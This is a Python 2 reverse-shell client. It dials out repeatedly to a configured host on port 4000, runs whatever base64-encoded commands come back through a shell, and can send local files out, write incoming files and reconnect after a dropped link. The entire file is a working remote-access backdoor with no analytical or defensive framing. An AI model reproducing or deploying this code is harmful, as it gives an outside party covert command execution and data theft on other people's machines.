#!/usr/bin/python

import subprocess,socket
import os
import time
import base64
HOST = 'Enter Victim IP Adress Here'
PORT = 4000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
active = False
while True:
        try:
                s.connect((HOST,PORT))
        except Exception:
                s.close()
                time.sleep(2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
                break

while True:
	data = s.recv(1024)
	decoded = base64.b64decode(data)

	time.sleep(0.8)
	success = base64.b64encode("[*]Connection Established!EOFXEOFXEOFX")
	s.send(success)
	active = True
	while active:
		data = s.recv(1024)
		decoded = base64.b64decode(data)
		if 'cd' in decoded:
			msg = decoded.replace("cd ", "")
			if os.path.exists(msg):
				os.chdir(msg)
				s.send(base64.b64encode("[INFO]Changed directory to " + os.getcwd() + "EOFXEOFXEOFX"))
			else:
				s.send(base64.b64encode("[ERROR] Invalid path.EOFXEOFXEOFX"))
		elif 'download' in decoded:
			sendFile = decoded[9:]
			try:
                                with open(sendFile, 'rb') as f:
                                        while True:
                                                fileData = f.read(1024)
                                                if fileData == '': break
                                                s.sendall(fileData)
                                f.close()
                                time.sleep(0.8)
                                s.sendall('EOFXEOFXEOFX')
                                time.sleep(0.8)
                                s.sendall(base64.b64encode("Finished Downloading.EOFXEOFXEOFX"))
                        except IOError:
                                s.send(base64.b64encode("\n[ERROR]Invalid File."))
		elif 'upload' in decoded:
			downFile = decoded[7:]
			if os.path.isfile(downFile) == True:
                                g = open(downFile, 'wb')
                                while True:
                                        b = s.recv(1024)
                                        while (b):
                                                if b.endswith("EOFXEOFXEOFX"):
                                                        a = b[:-12]
                                                        g.write(a)
                                                        break
                                                else:
                                                        g.write(b)
                                                        b = s.recv(1024)
                                        break
                                g.close()
                                s.send(base64.b64encode("Finished Uploading.EOFXEOFXEOFX"))
                        else:
                                s.send(base64.b64encode("\n[ERROR]Invalid File."))
		elif decoded.startswith('quit') == True:
                        sendData = 'Exit\n EOFXEOFXEOFX'
                        s.send(base64.b64encode(sendData))
		else:
			PROC = subprocess.Popen(decoded, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			output = PROC.stdout.read() + PROC.stderr.read() + "EOFXEOFXEOFX"
			encoded = base64.b64encode(output)
                        try:
			     s.send(encoded)
                        except socket.error:
                                while True:
                                        try:
                                                s.connect((HOST,PORT))
                                        except Exception:
                                                s.close()
                                                time.sleep(2)
                                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        else:
                                                break

